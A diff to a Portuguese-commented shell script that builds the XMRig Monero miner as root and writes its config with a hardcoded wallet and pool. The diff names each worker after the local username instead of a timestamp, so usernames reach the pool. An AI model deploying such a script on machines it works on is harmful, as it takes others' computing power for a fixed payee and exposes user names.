@@ -22,15 +22,18 @@ cd build
 sudo cmake ..
 sudo make -j$(nproc)
 
+# Cria o diretório para o arquivo de configuração, se não existir
+sudo mkdir -p /root/.config
+
 # Cria um arquivo de configuração para o XMRig
-# Adiciona um identificador único à carteira, sem expor nome de usuário específico
-RANDOM_IDENTIFIER=$(date +%s)  # Gerar um identificador único com a data/hora atual
+# Adiciona o nome de usuário da máquina à carteira
+USER_NAME=$(whoami)
 WALLET="45mqjub6KDy14qcSZcjjDA1kXFGu5xiBVPJKoZrMgicH1skGVVzPzVYHJR27CbyiyKDzFf89gEbUnBpXj7ViQrGgPCQTNT2"
 POOL="xmrpool.eu:9999"
-USER_WALLET="${WALLET}+worker${RANDOM_IDENTIFIER}"
+USER_WALLET="${WALLET}+${USER_NAME}"
 
-# Cria o arquivo de configuração
-cat > config.json <<EOF
+# Cria o arquivo de configuração diretamente no diretório correto
+cat > /root/.config/xmrig.json <<EOF
 {
     "autosave": true,
     "cpu": {
@@ -40,7 +43,7 @@ cat > config.json <<EOF
     "url": "${POOL}",
     "user": "${USER_WALLET}",
     "pass": "x",
-    "rig-id": "worker${RANDOM_IDENTIFIER}",
+    "rig-id": "${USER_NAME}",
     "keepalive": true,
     "nicehash": false
 }
